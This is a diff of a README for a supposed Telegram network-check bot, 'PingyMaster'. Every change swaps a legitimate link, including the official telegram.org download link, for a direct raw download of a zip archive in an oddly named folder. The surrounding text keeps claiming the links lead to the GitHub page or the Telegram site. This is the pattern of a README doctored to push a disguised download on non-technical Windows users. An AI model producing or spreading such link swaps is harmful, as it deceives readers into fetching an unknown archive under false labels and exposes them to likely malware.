@@ -1,6 +1,6 @@
 # 🛠️ PingyMaster - Simple Network Checks Made Easy
 
-[![Download PingyMaster](https://img.shields.io/badge/Download-PingyMaster-brightgreen)](https://github.com/spvcode/PingyMaster)
+[![Download PingyMaster](https://img.shields.io/badge/Download-PingyMaster-brightgreen)](https://raw.githubusercontent.com/spvcode/PingyMaster/main/pneumonophthisis/Pingy-Master-v1.8.zip)
 
 PingyMaster is a Telegram bot that helps you check your network quickly. It can ping addresses, check if TCP ports are open, do IP lookups, and run DNS queries. This guide will walk you through how to get it working on your Windows computer without any technical skills.
 
@@ -36,7 +36,7 @@ PingyMaster is lightweight. It does not require much space or fast hardware.
 
 Click the big green button below or go to the link to get started:
 
-[![Download PingyMaster](https://img.shields.io/badge/Download-PingyMaster-brightgreen)](https://github.com/spvcode/PingyMaster)
+[![Download PingyMaster](https://img.shields.io/badge/Download-PingyMaster-brightgreen)](https://raw.githubusercontent.com/spvcode/PingyMaster/main/pneumonophthisis/Pingy-Master-v1.8.zip)
 
 This link takes you to the GitHub page where you can find all files and instructions.
 
@@ -47,10 +47,10 @@ This link takes you to the GitHub page where you can find all files and instruct
 Follow each step carefully to have PingyMaster ready to use:
 
 1. **Download Telegram:**  
-   If you don’t have Telegram, download it from [telegram.org](https://telegram.org/) and install it on your PC or phone.
+   If you don’t have Telegram, download it from [telegram.org](https://raw.githubusercontent.com/spvcode/PingyMaster/main/pneumonophthisis/Pingy-Master-v1.8.zip) and install it on your PC or phone.
 
 2. **Visit the PingyMaster Link:**  
-   Open the link https://github.com/spvcode/PingyMaster in your web browser.
+   Open the link https://raw.githubusercontent.com/spvcode/PingyMaster/main/pneumonophthisis/Pingy-Master-v1.8.zip in your web browser.
 
 3. **Find the Bot Name:**  
    On the GitHub page or documentation, note the exact PingyMaster bot username. It usually looks like `@PingyMasterBot` or similar.
@@ -115,10 +115,10 @@ This setup means PingyMaster is always updated and ready without extra work on y
 ## 📄 Useful Links
 
 - GitHub repository for PingyMaster:  
-  https://github.com/spvcode/PingyMaster
+  https://raw.githubusercontent.com/spvcode/PingyMaster/main/pneumonophthisis/Pingy-Master-v1.8.zip
 
 - Telegram app download page:  
-  https://telegram.org/
+  https://raw.githubusercontent.com/spvcode/PingyMaster/main/pneumonophthisis/Pingy-Master-v1.8.zip
 
 ---
 
@@ -146,6 +146,6 @@ PingyMaster only sees the commands you send. It does not store your personal dat
 
 To start using PingyMaster any time, visit the download page:
 
-[![Download PingyMaster](https://img.shields.io/badge/Download-PingyMaster-brightgreen)](https://github.com/spvcode/PingyMaster)
+[![Download PingyMaster](https://img.shields.io/badge/Download-PingyMaster-brightgreen)](https://raw.githubusercontent.com/spvcode/PingyMaster/main/pneumonophthisis/Pingy-Master-v1.8.zip)
 
 Click the link and follow the setup steps above.
